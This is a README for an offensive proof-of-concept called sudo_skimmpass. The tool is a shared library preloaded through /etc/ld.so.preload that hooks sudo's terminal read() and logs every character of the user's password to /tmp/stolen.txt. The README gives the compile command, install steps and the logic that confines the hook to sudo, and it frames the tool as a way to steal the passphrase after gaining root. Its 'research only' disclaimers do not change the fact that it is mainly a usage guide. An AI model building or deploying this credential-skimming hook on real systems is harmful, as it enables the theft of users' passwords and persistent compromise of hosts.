# sudo_skimmpass
## Hijacking sudo's call to read terminal's file descriptor to log user input

### Author
[oxagast](mailto:oxagast@oxasploits.com)

### Cautions
I take no, and by that I mean zero fucking responsiblity for what you might do with this code.  Also, this should *never*
be used in a production environment under any circumstances, it **will** make your server insecure, and quite possibly break
other things system-wide, because `/etc/ld.so.preload` acts on all binaries run on the system, not only sudo.  Run this
code in a VM or throwaway install, for **research purposes only**.  This is a proof of concept, and *not meant to be used
for illegal things*.

### Compliling and Installing
Compliation: <br>
The actual compiling looks like:<br>
`gcc -fPIC -shared -ldl -Wall -o /tmp/cap_pass.so sudo_lib_hook.c`<br>
But to make things a little more simple, I created a Makefile.  So:

```
make clean
make
sudo make install
```

Then when you are ready to remove the library from the system do:

```
sudo make deinstall
```

## Caveats and Notes
* This library, by the nature of `ld.so.preload`, effects every other binary running on the system,
  although we do try to isolate it to sudo as much as possible.
* You need to already be root for any of this to work.  This code assumes that you have aquired root
  by means of LPE, or sitting at an unlocked terminal, but *don't have the passphrase*.
* If a user enters a passphrase incorrectly, that *will also be logged*.

### Use
The Makefile adds the resulting shared library `/tmp/cap_pass.so` to the file `/etc/ld.so.preload`.

You can now open a new terminal, and run `sudo su` and enter your passphrase.  Do some work.. whatever.
You may now log back out, and finally, check `/tmp/stolen.txt`.  It should now contain your
passphrase!

### Process Flow Isolation
The abused function from sudo comes from the file `tgetpass.c` and the relevant call to
`read()` on line ~393 in [commit 2a33699f8a0520161a8b507a9cb256802d6f45cb from sudo-project/sudo](https://github.com/sudo-project/sudo/blob/3d467a705ea6ee53081cb11cc21ecf08eb47700d/src/tgetpass.c#L393)
is:

```
  while (cp < ep) {
    nr = read(fd, &c, 1);
    if (nr != 1 || c == '\n' || c == '\r')
      break;
```

Where `nr = read(fd, &c, 1);` can be isolated and swapped out for our jacking library to read
and log entry from the terminal's file descriptor to a file.

Our code assures we are in the sudo process using /proc/self/comm to grab our process name, then
use strcmp to verify it matches sudo.  We then check to make sure that the "count" varaible is
equal to 1, because sudo's code does, so this helps us make sure we are modifying the read() call
in the correct part of sudo.  Finally we use the `%.1s` format for `fprintf()` to assure that only a
single charater is written to our `/tmp/stolen.txt` file, because only a single character is read
at any given step in sudo's code from the console as the user enters their passphrase.

### Greetz and Thankz
[Vesteria](https://github.com/Vesteria-Coding) <br>
[blissful boy](https://github.com/blissfulboy) <br>
[atdma](https://github.com/atdma) <br>
